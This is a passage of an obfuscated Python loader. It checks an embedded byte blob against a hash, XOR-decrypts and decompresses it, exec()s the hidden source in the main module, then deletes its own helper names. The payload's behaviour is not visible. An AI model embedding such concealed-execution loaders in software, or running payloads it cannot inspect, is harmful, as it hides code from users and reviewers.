_ctsvz_Dc0vYtCV + _cktVtfKCZbWUjU + _caDzc0Z4g1CKVZ + _cwHQHBTXimuN78 + _ctHwUEQJOfYNiC + _clqTibdsYGaXSY + _c_kUSNFFrpjQTh + _clzTHfByvCdE5Z + _c_6UXHew91mf_z + _cxsqb8_IpWVOjr + _czWS1_VEdwyoEs + _caAxCqdZCamkMF + _ckuzUywIZXNVWV + _cerr94kr1Lq7GJ + _crq387xGInO1bq + _cfpccE6xB8XqWQ + _cdF40TZ5Q73EZY + _ckW2_FaVv_GGr5 + _cctdcIxNN0UE0k + _ccQQoUJEG2bHGH + _ciKzPVtwZDevv4 + _ceNiMoIYkGByUU + _ctAihSdlGyxbBQ + _crND3cgG2X5BND + _crCeP355YNeCxG + _cejqV4YydWFTeP + _cyJZPu7EjokxlZ + _cq4gZolMNQmr2N + _cp8b1XbD8am8zL + _cdYn2DfdZVPajk + _csdUyzGeSSxd5x + _cwuRg6gRbKeVTe + _cgb_kOz_UbpI6_ + _cnJUBxnPkJrhgC + _csxKi7bHbny4D2 + _csIjrW8PmsrWrp + _cw4xNDsDCJmQem + _cyvnXNfH7mWrK0 + _cjaksyy34uoWqL + _czMa_WUZH0j7RE + _chv8P_7RaCqpfh + _csHB3xWfFDJASa + _ch6Ii_7yypdIzs + _cn9qQ93hwlNCm7 + _cbjUgf69IjqJ_B + _cnANo7XxxBCyf2 + _csr0iF8tTGZt9r + _czStWJX8yrcocR + _cdFf4RM7hslt5u + _cepXh37wl7mzxe + _ckxAygOtTxbtXo + _cvrJ_W6k0WBJ7u + _crnNoTTffU7eqj + _ctMEDy1_D9KyyJ + _ccjOKAxEn__bIF)
if __import__('hashlib').sha256(_paFb8q7ZslzdfV).hexdigest() != '9796d539f0d1bce497c0c2cfdb0a1e31cc40a6c75b71aa49e0f8ce42f1cb2598':
    __import__('sys').exit(1)
_xnQlbAQgc3R5CO = bytes([145, 88, 80, 251, 41, 102, 211, 149, 87, 250, 116, 125, 239, 234, 160, 150, 248, 22, 8, 93, 8, 102, 151, 137, 52, 5, 58, 180, 98, 158, 25, 130])
_fkr4xwia2qHyd1t = bytes([21, 226, 110, 106, 189, 35, 46, 101, 240, 70, 2, 15, 67, 66, 220, 236, 79, 217, 230, 249, 204, 229, 82, 40, 50, 85, 253, 60, 134, 7, 57, 249])

def _fxjfG6Z8gJHnQFW(_bn243Sqal3IGT7, _khp9Dad3z0cO4R):
    return bytes(_bn243Sqal3IGT7[_ijX7DTmDnxzrsQ] ^ _khp9Dad3z0cO4R[_ijX7DTmDnxzrsQ % len(_khp9Dad3z0cO4R)] for _ijX7DTmDnxzrsQ in range(len(_bn243Sqal3IGT7)))

def _fdq4rYHHIfi25nd(_tqHutXsKStPPes):
    import zlib
    return zlib.decompress(_tqHutXsKStPPes) # Un seul niveau de zlib ici pour simplifier

def _fevlZZeGUyxFKhu():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xjiiaoA4ZAnItU = _fxjfG6Z8gJHnQFW(_paFb8q7ZslzdfV, _xnQlbAQgc3R5CO)
    # 2. Décompression Zlib
    _dtejohDUGlui2F = _fdq4rYHHIfi25nd(_xjiiaoA4ZAnItU)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtejohDUGlui2F.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ntgyurPUGsRWw3 = _main.__dict__
    _ntgyurPUGsRWw3.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ntgyurPUGsRWw3)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevlZZeGUyxFKhu()
try:
    del _fxjfG6Z8gJHnQFW, _fdq4rYHHIfi25nd, _fevlZZeGUyxFKhu
    del _paFb8q7ZslzdfV, _xnQlbAQgc3R5CO, _fkr4xwia2qHyd1t
except:
    pass
